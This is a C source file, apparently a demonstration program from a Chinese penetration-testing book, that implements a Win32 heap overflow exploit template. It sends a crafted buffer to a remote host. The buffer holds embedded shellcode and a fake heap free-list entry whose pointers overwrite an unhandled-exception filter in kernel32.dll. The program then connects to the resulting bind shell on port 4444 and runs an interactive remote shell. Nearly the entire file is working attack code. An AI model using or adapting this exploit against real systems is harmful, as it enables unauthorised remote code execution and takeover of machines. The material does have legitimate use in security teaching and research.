/* heapexp1.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  Win32堆溢出攻击模版1－精确定位shellcode
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment (lib,"ws2_32")

#include "shellcode1.c"

#define BasepCurrentTopLevelFilter  0x77EB73B4  // Dependence your kernel32.dll
#define OFFSET                      2056        // Offset of the last FreeEntry 2056=0x80*8+8+0x80*8

/////////////////////////////////////////////////////////
//
//	Some heap definitions
//
/////////////////////////////////////////////////////////

#define HEAP_ENTRY_BUSY             0x01
#define HEAP_ENTRY_EXTRA_PRESENT    0x02
#define HEAP_ENTRY_FILL_PATTERN     0x04
#define HEAP_ENTRY_VIRTUAL_ALLOC    0x08
#define HEAP_ENTRY_LAST_ENTRY       0x10
#define HEAP_ENTRY_SETTABLE_FLAG1   0x20
#define HEAP_ENTRY_SETTABLE_FLAG2   0x40
#define HEAP_ENTRY_SETTABLE_FLAG3   0x80
#define HEAP_ENTRY_SETTABLE_FLAGS   0xE0

typedef struct _HEAP_FREE_ENTRY {
    USHORT Size;
    USHORT PreviousSize;
    UCHAR SegmentIndex;
    UCHAR Flags;
    UCHAR Index;
    UCHAR Mask;
    LIST_ENTRY FreeList;
} HEAP_FREE_ENTRY, *PHEAP_FREE_ENTRY;

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
    int     l;
    char    buf[512];
    struct    timeval time;
    unsigned long    ul[2];

    time.tv_sec = 1;
    time.tv_usec = 0;

    while (1) 
    {
        ul[0] = 1;
        ul[1] = sock;

        l = select (0, (fd_set *)&ul, NULL, NULL, &time);
        if(l==1)
        {
            l = recv (sock, buf, sizeof (buf), 0);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
            l = write (1, buf, l);
            if (l <= 0) 
            {
                printf ("[-] Connection closed.\n");
                return;
            }
        }
        else
        {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }
            l = send(sock, buf, l, 0);
            if (l <= 0) 
            {
                printf("[-] Connection closed.\n");
                return;
            }
        }
    }
}

int main(int argc, char *argv[])
{
    unsigned char  Buff[0x2000];
    unsigned char  data;
    unsigned short bindport;

    SOCKET  c,s;
    WSADATA WSAData;
    unsigned short port;
    struct sockaddr_in sa;
    int salen = sizeof(sa);
    int l,i,j,k;
    PHEAP_FREE_ENTRY pFakeEntry;

    if (argc < 3)
    {
        fprintf(stderr, "Usage: %s remote_addr remote_port bind_port", argv[0]);
        exit(1);
    }

    if (argc > 3)
    {
        bindport = atoi(argv[3]);
    }
    else
    {
        bindport = 4444;
    }

    GetShellCode();
    if (sh_Len == 0)
    {
        fprintf(stderr, "Generate shellcode failed!\n");
        exit(1);
    }

    Enc_key  += Enc_key << 8;
    bindport ^= Enc_key;    
    memcpy(&sh_Buff[sh_Len-4], &bindport, 2);
    bindport ^= Enc_key;

    if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
    {
        printf("[-] WSAStartup failed.\n");
        WSACleanup();
        exit(1);
    }

    s = Make_Connection(argv[1], atoi(argv[2]), 10);
    if(s<0)
    {
        printf("[-] connect err.\n");
        exit(1);
    }

    // Construct Buff
    memset(Buff, 'A', sizeof(Buff));
    // The first 8 bytes will be overwrite when free buf1
    memcpy(Buff+8, sh_Buff, sh_Len);

    pFakeEntry = (PHEAP_FREE_ENTRY)&Buff[OFFSET];

	pFakeEntry->FreeList.Flink = (LIST_ENTRY*)0x04EB06EB; // jump over
	pFakeEntry->FreeList.Blink = (LIST_ENTRY*)BasepCurrentTopLevelFilter;

	Buff[OFFSET+0x10]=0;

    i = send(s,Buff,sizeof(Buff),0);

    Sleep(1000);

    c = Make_Connection(argv[1], bindport, 10);
    if(c<0)
    {
        printf("[-] connect err.\n");
        exit(1);
    }

    shell(c);

    WSACleanup();
    return 1;
}
